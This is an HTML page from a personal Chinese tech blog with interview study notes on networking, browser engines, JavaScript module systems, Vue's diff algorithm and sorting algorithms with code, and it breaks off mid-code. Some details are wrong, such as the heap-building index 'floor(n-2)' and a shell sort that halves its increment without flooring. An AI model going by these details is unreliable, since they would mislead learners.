
 <!DOCTYPE HTML>
<html lang="zh-hk">
<head>
  <meta charset="UTF-8">
  
    <title>圆玉的博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="Ruiyu Lin">
    

    
    <meta name="description" content="林瑞玉的博客">
<meta property="og:type" content="website">
<meta property="og:title" content="圆玉的博客">
<meta property="og:url" content="http://lry1994.github.io/page/2/index.html">
<meta property="og:site_name" content="圆玉的博客">
<meta property="og:description" content="林瑞玉的博客">
<meta property="og:locale" content="zh-hk">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="圆玉的博客">
<meta name="twitter:description" content="林瑞玉的博客">

    
    <link rel="alternative" href="/atom.xml" title="圆玉的博客" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css">
</head>

  <body>
    <header>
      
<div>
		
			<div id="imglogo">
				<a href="/"><img src="/img/logo.png" alt="圆玉的博客" title="圆玉的博客"/></a>
			</div>
			
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="圆玉的博客">圆玉的博客</a></h1>
				<h2 class="blog-motto"></h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li>
 					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
						<input type="hidden" name="q" value="site:lry1994.github.io">
					</form>
					
					</li>
				</ul>
			</nav>			
</div>
    </header>
    <div id="container">
      <div id="main">

   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/study/2018/9/network.html" title="面经收集--网络/浏览器/模块化/diff原理" itemprop="url">面经收集--网络/浏览器/模块化/diff原理</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="Ruiyu Lin" target="_blank" itemprop="author">Ruiyu Lin</a>
		
  <p class="article-time">
    <time datetime="2018-10-09T16:00:00.000Z" itemprop="datePublished"> Published 2018-10-10</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p><a href="https://segmentfault.com/a/1190000011635556?utm_source=tag-newest" target="_blank" rel="noopener">https://segmentfault.com/a/1190000011635556?utm_source=tag-newest</a></p>
<h4 id="https（对是https）有1次握手"><a href="#https（对是https）有1次握手" class="headerlink" title="https（对是https）有1次握手"></a>https（对是https）有1次握手</h4><p>可以把https拆成tcp/tls/http这三层来看，tcp handshake &gt;&gt; TLS(SSL) handshake &gt;&gt; http request/response<br><img src="/study/2018/9/network/https.png"><br><a href="https://blog.csdn.net/u012361288/article/details/54883154" target="_blank" rel="noopener">https://blog.csdn.net/u012361288/article/details/54883154</a></p>
<p><a href="http://www.cnblogs.com/lovesong/p/5186200.html" target="_blank" rel="noopener">http://www.cnblogs.com/lovesong/p/5186200.html</a></p>
<h3 id="tcp的三次握手和四次挥手画图（当场画写ack-和-seq的值）-为什么tcp要三次握手四次挥手？"><a href="#tcp的三次握手和四次挥手画图（当场画写ack-和-seq的值）-为什么tcp要三次握手四次挥手？" class="headerlink" title="tcp的三次握手和四次挥手画图（当场画写ack 和 seq的值）,为什么tcp要三次握手四次挥手？"></a>tcp的三次握手和四次挥手画图（当场画写ack 和 seq的值）,为什么tcp要三次握手四次挥手？</h3><img src="/study/2018/9/network/tcp_3_wo.png">
<img src="/study/2018/9/network/tcp_4_hui.png">
<h4 id="TCP与UDP的区别"><a href="#TCP与UDP的区别" class="headerlink" title="TCP与UDP的区别"></a>TCP与UDP的区别</h4><p>1、TCP面向连接（如打电话要先拨号建立连接）;UDP是无连接的，即发送数据之前不需要建立连接。</p>
<p>2、TCP提供可靠的服务。也就是说，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达;UDP尽最大努力交付，即不保证可靠交付。</p>
<p>3、TCP面向字节流，实际上是TCP把数据看成一连串无结构的字节流;UDP是面向报文的。UDP没有拥塞控制，因此网络出现拥塞不会使源主机的发送速率降低（对实时应用很有用，如IP电话，实时视频会议等）。</p>
<p>4、每一条TCP连接只能是点到点的;UDP支持一对一，一对多，多对一和多对多的交互通信。</p>
<p>5、TCP首部开销20字节;UDP的首部开销小，只有8个字节。</p>
<p>6、TCP的逻辑通信信道是全双工的可靠信道，UDP则是不可靠信道。</p>
<h4 id="http2的持久连接和管线化"><a href="#http2的持久连接和管线化" class="headerlink" title="http2的持久连接和管线化"></a>http2的持久连接和管线化</h4><p>在长连接的基础上，将客户端的其他请求都交给这一个连接去处理。这里服务器需要注意一件事情。那就是这个请求的先后顺序是不能颠倒的</p>
<p>在使用持久连接的情况下，某个连接消息的传递类似于</p>
<p>请求1 -&gt; 响应1 -&gt; 请求2 -&gt; 响应2</p>
<p>管线化：某个连接上的消息变成了类似这样 </p>
<p>请求1 -&gt; 请求2 -&gt; 请求3 -&gt; 响应1 -&gt; 响应2 -&gt; 响应3</p>
<ol>
<li><p>只有GET和HEAD要求可以进行管线化，而POST则有所限制</p>
</li>
<li><p>初次创建连接时也不应启动管线机制，因为对方（服务器）不一定支持HTTP/1.1版本的协议。</p>
</li>
<li><p>HTTP1.1要求服务器端支持管线化，但并不要求服务器端也对响应进行管线化处理，只是要求对于管线化的请求不失败，而且现在很多服务器端和代理程序对管线化的支持并不好，现代浏览器Chrome和Firefox默认并未开启管线化支持</p>
<h4 id="域名发散和域名收敛"><a href="#域名发散和域名收敛" class="headerlink" title="域名发散和域名收敛"></a>域名发散和域名收敛</h4><p>浏览器对于同一域名下允许的并发请求数作了限制</p>
<img src="/study/2018/9/network/per-hostname-max.jpg">
<p>域名发散就是为了突破浏览器对于同一域名并发请求数的限制</p>
</li>
</ol>
<p>域名收敛就是将静态资源放在一个域名下不进行发散，这主要是为了适应移动端的发展需求；通常DNS是一个开销较大的操作，而移动端由于网络带宽和实时性、资源等的限制，这些开销对移动端的用户体验是致命的，因此需要进行域名收敛；</p>
<h3 id="五大浏览器-四大内核"><a href="#五大浏览器-四大内核" class="headerlink" title="五大浏览器\四大内核"></a>五大浏览器\四大内核</h3><p>四大内核分别是：Trident（也称IE内核）、webkit、Blink、Gecko。</p>
<p>五大浏览器采用的都是单内核，而随着浏览器的发展现在也出现了双内核。像360浏览器、QQ浏览器都是采用双内核。</p>
<ol>
<li>IE                   ：Trident；</li>
<li>Chrome               ：Webkit  —-&gt; Blink；</li>
<li>Firefox              ：Gecko</li>
<li>Safari               ：Webkit；</li>
<li>Opera                ：自己的Presto内核 —-&gt; Webkit —-&gt;Blink</li>
<li>360、猎豹             ：Trident + Chrome；</li>
<li>搜狗、遨游、QQ浏览器   ：Trident（兼容模式）+ Webkit（高速模式）；</li>
<li>百度览器、世界之窗     ：Trident；</li>
<li>2345                 ：Trident —-&gt; IE + Chrome；</li>
</ol>
<h3 id="webpack的loader和plugins的区别"><a href="#webpack的loader和plugins的区别" class="headerlink" title="webpack的loader和plugins的区别"></a>webpack的loader和plugins的区别</h3><p>loader 用于加载某些资源文件。 因为webpack 本身只能打包commonjs规范的js文件，对于其他资源例如 css，图片，或者其他的语法集，比如 jsx， coffee，是没有办法加载的。 这就需要对应的loader将资源转化，加载进来。从字面意思也能看出，loader是用于加载的，它作用于一个个文件上。</p>
<p>plugin 用于扩展webpack的功能。它直接作用于 webpack，扩展了它的功能。当然loader也时变相的扩展了 webpack ，但是它只专注于转化文件（transform）这一个领域。而plugin的功能更加的丰富，而不仅局限于资源的加载</p>
<h4 id="对模块化了解吗？说说有哪些模块化的库，有了解过模块化的发展的历史吗？（commonJS，RequireJS，SeaJS）"><a href="#对模块化了解吗？说说有哪些模块化的库，有了解过模块化的发展的历史吗？（commonJS，RequireJS，SeaJS）" class="headerlink" title="对模块化了解吗？说说有哪些模块化的库，有了解过模块化的发展的历史吗？（commonJS，RequireJS，SeaJS）"></a>对模块化了解吗？说说有哪些模块化的库，有了解过模块化的发展的历史吗？（commonJS，RequireJS，SeaJS）</h4><p><a href="https://segmentfault.com/a/1190000011081338" target="_blank" rel="noopener">https://segmentfault.com/a/1190000011081338</a></p>
<p>AMD CMD ，这两个东西是一种规范，他们实际产物是 AMD是RequireJS，CMD的产物是seajs，他们的出现都是在COMMONjs基础上发展而来的。</p>
<p>AMD偏向于依赖前置，CMD偏向于用到时才运行的思路，从而导致了依赖项的加载和运行时间点会不同</p>
<h4 id="CommonJS和ES6的加载区别"><a href="#CommonJS和ES6的加载区别" class="headerlink" title="CommonJS和ES6的加载区别"></a>CommonJS和ES6的加载区别</h4><p>与CommonJS用require()方法加载模块不同，在ES6中，import命令可以具体指定加载模块中用export命令暴露的接口（不指定具体的接口，默认加载export default），没有指定的是不会加载的，因此会在编译时就完成模块的加载，这种加载方式称为编译时加载或者静态加载。<br>而CommonJS的require()方法是在运行时才加载的</p>
<h4 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h4><p>对AMD,CMD,CommonJS有没有了解?<br>为什么要模块化？不用的时候和用RequireJs的时候代码大概怎么写？<br>说说有哪些模块化的库，有了解过模块化的发展的历史吗？<br>分别说说同步和异步模块化的应用场景，说下AMD异步模块化实现的原理？<br>如何将项目里面的所有的require的模块语法换成import的ES6的语法？<br>使用模块化加载时，模块加载的顺序是怎样的，如果不知道，根据已有的知识，你觉得顺序应该是怎么样的？</p>
<h4 id="深入Vue2-x的虚拟DOM-diff原理"><a href="#深入Vue2-x的虚拟DOM-diff原理" class="headerlink" title="深入Vue2.x的虚拟DOM diff原理"></a>深入Vue2.x的虚拟DOM diff原理</h4><p>仅在同级的vnode间做diff<br>（一）优先处理特殊场景</p>
<p>（1）oldstart和newstart同类型 \ oldend和newend同类型:不用移动它们对应的DOM</p>
<p>（2）oldStart和newEnd，以及oldEnd和newStart指向同类节点的: 直接移动DOM就好</p>
<p>（二）、“原地复用”</p>
<p>Vue在判断更新前后指针是否指向同一个节点，其实不要求它们真实引用同一个DOM节点，实际上它仅判断指向的是否是同类节点（比如2个不同的div，在DOM上它们是不一样的，但是它们属于同类节点），如果是同类节点，那么Vue会直接复用DOM，这样的好处是不需要移动DOM。</p>
<p><a href="https://blog.csdn.net/m6i37jk/article/details/78140159#commentBox" target="_blank" rel="noopener">https://blog.csdn.net/m6i37jk/article/details/78140159#commentBox</a></p>
<h4 id="一个静态资源要上线，里面有各种资源依赖，你如何平稳上线"><a href="#一个静态资源要上线，里面有各种资源依赖，你如何平稳上线" class="headerlink" title="一个静态资源要上线，里面有各种资源依赖，你如何平稳上线"></a>一个静态资源要上线，里面有各种资源依赖，你如何平稳上线</h4><p><a href="http://www.yyyweb.com/4707.html" target="_blank" rel="noopener">http://www.yyyweb.com/4707.html</a></p>
<p>配置超长时间的本地缓存 —— 节省带宽，提高性能</p>
<p>采用内容摘要作为缓存更新依据 —— 精确的缓存控制</p>
<p>静态资源CDN部署 —— 优化网络请求</p>
<p>更资源发布路径实现非覆盖式发布 —— 平滑升级</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/学习/">学习</a>►<a class="article-category-link" href="/categories/学习/专题笔记/">专题笔记</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/面试/">面试</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/study/2018/9/8-sort.html" title="八大排序算法、KMP" itemprop="url">八大排序算法、KMP</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="Ruiyu Lin" target="_blank" itemprop="author">Ruiyu Lin</a>
		
  <p class="article-time">
    <time datetime="2018-10-07T16:00:00.000Z" itemprop="datePublished"> Published 2018-10-08</time>
    
  </p>
</header>
    <div class="article-content">
        
         <img src="/study/2018/9/8-sort/8-sort.png">
<p>当n较大，则应采用时间复杂度为O(nlog2n)的排序方法：快速排序、堆排序或归并排序。</p>
<p>快速排序：是目前基于比较的内部排序中被认为是最好的方法，当待排序的关键字是随机分布时，快速排序的平均时间最短；</p>
<h2 id="插入排序—直接插入排序-Straight-Insertion-Sort"><a href="#插入排序—直接插入排序-Straight-Insertion-Sort" class="headerlink" title="插入排序—直接插入排序(Straight Insertion Sort)"></a>插入排序—直接插入排序(Straight Insertion Sort)</h2><p>时间复杂度：O（n^2）稳定</p>
<h4 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想:"></a>基本思想:</h4><p>每个元素向前找到属于自己的位置，后面元素后移.</p>
<p>将一个记录插入到已排序好的有序表中，从而得到一个新，记录数增1的&gt;有序表。即：先将序列的第1个记录看成是一个有序的子序列，然后从第&gt;2个记录逐个进行插入，直至整个序列有序为止。</p>
<p>要点：设立哨兵，作为临时存储和判断数组边界之用。</p>
<p>直接插入排序示例：<br> <img src="/study/2018/9/8-sort/insert_sort.png"></p>
<p>如果碰见一个和插入元素相等的，那么插入元素把想插入的元素放在相等元素的后面。所以，相等元素的前后顺序没有改变，从原无序序列出去的顺序就是排好序后的顺序，所以插入排序是<code>稳定</code>的。</p>
<h4 id="算法的实现："><a href="#算法的实现：" class="headerlink" title="算法的实现："></a>算法的实现：</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">InsertSort</span>(<span class="params">a</span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i= <span class="number">1</span>; i&lt;a.length; i++)&#123; </span><br><span class="line">    <span class="keyword">if</span>(a[i] &lt; a[i<span class="number">-1</span>])&#123; <span class="comment">//若第i个元素大于i-1元素，直接插入。小于的话，移动有序表后插入  </span></span><br><span class="line">        <span class="keyword">let</span> x = a[i]; <span class="comment">//复制为哨兵，即存储待排序元素 </span></span><br><span class="line">        a[i] = a[i<span class="number">-1</span>]; <span class="comment">//先后移一个元素 </span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> j= i<span class="number">-1</span>; </span><br><span class="line">        <span class="keyword">while</span>(j&gt;=<span class="number">0</span>&amp;&amp;x &lt; a[j])&#123; <span class="comment">//查找在有序表的插入位置 </span></span><br><span class="line">            a[j+<span class="number">1</span>] = a[j]; </span><br><span class="line">            j--; <span class="comment">//元素后移 ,这里减多了一次</span></span><br><span class="line">        &#125; </span><br><span class="line">        a[j+<span class="number">1</span>] = x; <span class="comment">//插入到正确位置 ,记得j+1</span></span><br><span class="line">    &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">a=[<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>]</span><br><span class="line">InsertSort(a)</span><br></pre></td></tr></table></figure>
<p>其他的插入排序有二分插入排序，2-路插入排序。</p>
<h2 id="插入排序—希尔排序（Shell-s-Sort）"><a href="#插入排序—希尔排序（Shell-s-Sort）" class="headerlink" title="插入排序—希尔排序（Shell`s Sort）"></a>插入排序—希尔排序（Shell`s Sort）</h2><p>希尔排序是1959 年由D.L.Shell 提出来的，相对直接排序有较大的改进。希尔排序又叫缩小增量排序</p>
<h4 id="基本思想："><a href="#基本思想：" class="headerlink" title="基本思想："></a>基本思想：</h4><p>先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录“基本有序”时，再对全体记录进行依次直接插入排序。</p>
<h4 id="操作方法："><a href="#操作方法：" class="headerlink" title="操作方法："></a>操作方法：</h4><p>1.选择一个增量序列t1，t2，…，tk，其中ti&gt;tj，tk=1；<br>2.按增量序列个数k，对序列进行k 趟排序；<br>3.每趟排序，根据对应的增量ti，将待排序列分割成若干长度为m 的子序列，分别对各子表进行直接插入排序。仅增量因子为1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。</p>
<p>希尔排序的示例：<br> <img src="/study/2018/9/8-sort/shell_sort.png"></p>
<h4 id="算法实现："><a href="#算法实现：" class="headerlink" title="算法实现："></a>算法实现：</h4><p>我们简单处理增量序列：增量序列d = {n/2 ,n/4, n/8 …..1} n为要排序数的个数</p>
<p>即：先将要排序的一组记录按某个增量d（n/2,n为要排序数的个数）分成若干组子序列，每组中记录的下标相差d.对每组中全部元素进行直接插入排序，然后再用一个较小的增量（d/2）对它进行分组，在每组中再进行直接插入排序。继续不断缩小增量直至为1，最后使用直接插入排序完成排序。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ShellInsertSort</span>(<span class="params">a, dk</span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i= dk; i&lt;a.length; ++i)&#123; </span><br><span class="line">    <span class="keyword">if</span>(a[i] &lt; a[i-dk])&#123; <span class="comment">//若第i个元素大于i-1元素，直接插入。小于的话，移动有序表后插入 </span></span><br><span class="line">        <span class="keyword">let</span> j = i-dk; </span><br><span class="line">        <span class="keyword">let</span> x = a[i]; <span class="comment">//复制为哨兵，即存储待排序元素 </span></span><br><span class="line">        a[i] = a[i-dk]; <span class="comment">//首先后移一个元素 </span></span><br><span class="line">        <span class="keyword">while</span>(x &lt; a[j])&#123; <span class="comment">//查找在有序表的插入位置 </span></span><br><span class="line">            a[j+dk] = a[j]; </span><br><span class="line">            j -= dk; <span class="comment">//元素后移 </span></span><br><span class="line">        &#125; </span><br><span class="line">        a[j+dk] = x; <span class="comment">//插入到正确位置 </span></span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellSort</span>(<span class="params">a</span>)</span>&#123; </span><br><span class="line">    <span class="keyword">let</span> len = a.length;</span><br><span class="line">    <span class="keyword">let</span> dk = len/<span class="number">2</span>; </span><br><span class="line">    <span class="keyword">while</span>( dk &gt;= <span class="number">1</span> )&#123; </span><br><span class="line">        ShellInsertSort(a, dk); </span><br><span class="line">        dk = dk/<span class="number">2</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"> a= [<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>]; </span><br><span class="line"><span class="comment">//ShellInsertSort(a,8,1); //直接插入排序 </span></span><br><span class="line">shellSort(a,<span class="number">8</span>); <span class="comment">//希尔插入排序</span></span><br></pre></td></tr></table></figure>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>希尔排序时效分析很难，关键码的比较次数与记录移动次数依赖于增量因子序列d的选取，特定情况下可以准确估算出关键码的比较次数和记录的移动次数。目前还没有人给出选取最好的增量因子序列的方法。增量因子序列可以有各种取法，有取奇数的，也有取质数的，但需要注意：增量因子中除1 外没有公因子，且最后一个增量因子必须为1。希尔排序方法是一个不稳定的排序方法。</p>
<h2 id="选择排序—简单选择排序（Simple-Selection-Sort）"><a href="#选择排序—简单选择排序（Simple-Selection-Sort）" class="headerlink" title="选择排序—简单选择排序（Simple Selection Sort）"></a>选择排序—简单选择排序（Simple Selection Sort）</h2><h4 id="基本思想：-1"><a href="#基本思想：-1" class="headerlink" title="基本思想："></a>基本思想：</h4><p>在要排序的一组数中，选出最小（或者最大）的一个数与第1个位置的数交换；然后在剩下的数当中再找最小（或者最大）的与第2个位置的数交换，依次类推，直到第n-1个元素（倒数第二个数）和第n个元素（最后一个数）比较为止。</p>
<p>简单选择排序的示例：<br><img src="/study/2018/9/8-sort/select_sort.png"></p>
<h4 id="操作方法：-1"><a href="#操作方法：-1" class="headerlink" title="操作方法："></a>操作方法：</h4><p>第一趟，从n 个记录中找出关键码最小的记录与第一个记录交换；<br>第二趟，从第二个记录开始的n-1 个记录中再选出关键码最小的记录与第二个记录交换；<br>以此类推…..<br>第i 趟，则从第i 个记录开始的n-i+1 个记录中选出关键码最小的记录与第i 个记录交换，<br>直到整个序列按关键码有序。</p>
<h4 id="算法实现：-1"><a href="#算法实现：-1" class="headerlink" title="算法实现："></a>算法实现：</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SelectMinKey</span>(<span class="params">a,start</span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">let</span> k = start; </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> j=start+<span class="number">1</span> ;j&lt;a.length; ++j) &#123; </span><br><span class="line">    <span class="keyword">if</span>(a[k] &gt; a[j]) k = j; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> k; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectSort</span>(<span class="params">a</span>)</span>&#123; </span><br><span class="line">    <span class="keyword">let</span> key, tmp; </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt; a.length; ++i) &#123; </span><br><span class="line">        key = SelectMinKey(a,i); <span class="comment">//选择最小的元素 </span></span><br><span class="line">        <span class="keyword">if</span>(key != i)&#123; </span><br><span class="line">        tmp = a[i]; a[i] = a[key]; a[key] = tmp; <span class="comment">//最小元素与第i位置元素互换 </span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">a = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>]; </span><br><span class="line">selectSort(a, <span class="number">8</span>);</span><br></pre></td></tr></table></figure>
<p>简单选择排序的改进——<code>二元选择排序</code></p>
<p>简单选择排序，每趟循环只能确定一个元素排序后的定位。我们可以考虑改进为每趟循环确定两个元素（当前趟最大和最小记录）的位置,从而减少排序所需的循环次数。改进后对n个数据进行排序，最多只需进行[n/2]趟循环即可。具体实现如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> SelectSort(int r[],int n) &#123; </span><br><span class="line">int i ,j , min ,max, tmp; </span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">1</span> ;i &lt;= n/<span class="number">2</span>;i++) &#123; </span><br><span class="line"><span class="comment">// 做不超过n/2趟选择排序 </span></span><br><span class="line">    min = i; max = i ; <span class="comment">//分别记录最大和最小关键字记录位置 </span></span><br><span class="line">    <span class="keyword">for</span> (j= i+<span class="number">1</span>; j&lt;= n-i; j++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (r[j] &gt; r[max]) &#123; </span><br><span class="line">            max = j ; <span class="keyword">continue</span> ; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span> (r[j]&lt; r[min]) &#123; </span><br><span class="line">            min = j ; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//该交换操作还可分情况讨论以提高效率 </span></span><br><span class="line">    tmp = r[i<span class="number">-1</span>]; r[i<span class="number">-1</span>] = r[min]; r[min] = tmp; </span><br><span class="line">    tmp = r[n-i]; r[n-i] = r[max]; r[max] = tmp; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="选择排序—堆排序（Heap-Sort）"><a href="#选择排序—堆排序（Heap-Sort）" class="headerlink" title="选择排序—堆排序（Heap Sort）"></a>选择排序—堆排序（Heap Sort）</h2><p>堆排序是一种树形选择排序，是对直接选择排序的有效改进。</p>
<h4 id="基本思想：-2"><a href="#基本思想：-2" class="headerlink" title="基本思想："></a>基本思想：</h4><p>堆排序的基本思想是：将待排序序列构造成一个<strong>大顶堆</strong>，此时，整个序列的最大值就是堆顶的根节点。<strong>将其与末尾元素进行交换，此时末尾就为最大值</strong>。然后将剩余n-1个元素重新构造成一个堆，这样会得到n个元素的次小值。如此反复执行，便能得到一个有序序列了</p>
<p>因此，实现堆排序需解决两个问题：</p>
<ol>
<li>建堆。 如何将n 个待排序的数建成堆；</li>
<li>调整堆。输出堆顶元素后，怎样调整剩余n-1 个元素，使其成为一个新堆。</li>
</ol>
<p>首先讨论第二个问题：输出堆顶元素后，对剩余n-1元素重新建成堆的调整过程。</p>
<h4 id="调整小顶堆的方法："><a href="#调整小顶堆的方法：" class="headerlink" title="调整小顶堆的方法："></a>调整小顶堆的方法：</h4><p>1）设有m 个元素的堆，输出堆顶元素后，剩下m-1 个元素。将堆底元素送入堆顶（（最后一个元素与堆顶进行交换），堆被破坏，其原因仅是根结点不满足堆的性质。</p>
<p>2）将根结点与左、右子树中<code>**较小**</code>元素的进行交换。</p>
<p>3）若与左子树交换：如果左子树堆被破坏，即左子树的根结点不满足堆的性质，则重复方法 （2）.</p>
<p>4）若与右子树交换，如果右子树堆被破坏，即右子树的根结点不满足堆的性质。则重复方法 （2）.</p>
<p>5）继续对不满足堆性质的子树进行上述交换操作，直到叶子结点，堆被建成。</p>
<p>称这个自根结点到叶子结点的调整过程为筛选。如图：<br><img src="/study/2018/9/8-sort/heap_sort_1.png"></p>
<p>再讨论对n 个元素初始建堆的过程。</p>
<h4 id="建堆方法："><a href="#建堆方法：" class="headerlink" title="建堆方法："></a>建堆方法：</h4><p>对初始序列建堆的过程，就是一个反复进行筛选的过程。</p>
<p>1）n 个结点的完全二叉树，则最后一个结点是第 <code>floor(n-2)</code>个结点的子树。</p>
<p>2）筛选从第<code>floor(n-2)</code>个结点为根的子树开始，该子树成为堆。</p>
<p>3）之后向前依次对各结点为根的子树进行筛选，使之成为堆，直到根结点。</p>
<p>如图建堆初始过程：无序序列：（49，38，65，97，76，13，27，49）<br> <img src="/study/2018/9/8-sort/heap_sort_2.png"></p>
<h4 id="算法的实现：-1"><a href="#算法的实现：-1" class="headerlink" title="算法的实现："></a>算法的实现：</h4><p>从算法描述来看，堆排序需要两个过程，一是建立堆，二是堆顶与堆的最后一个元素交换位置。所以堆排序有两个函数组成。一是建堆的渗透函数，二是反复调用渗透函数实现排序的函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 